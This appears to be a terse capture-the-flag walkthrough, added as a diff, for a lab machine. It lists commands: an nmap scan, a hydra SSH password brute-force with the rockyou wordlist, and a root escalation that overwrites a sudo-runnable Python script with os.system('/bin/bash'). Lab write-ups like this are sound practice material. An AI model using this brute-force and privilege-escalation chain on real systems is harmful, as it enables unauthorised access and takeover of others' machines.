@@ -1,0 +1,13 @@
+1 - nmap -A 10.10.163.193
+2 - http://10.10.163.193/robotst.txt -> (rockyou)
+3 - hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.163.193
+4 - sudo -l
+5 - rm -r bak.py
+6 - nano bak.py
+
+import os
+os.system("/bin/bash")
+
+7 - sudo /usr/bin/python3 /home/meliodas/bak.py
+8 - whoami
+9 - cat /root/root.txt
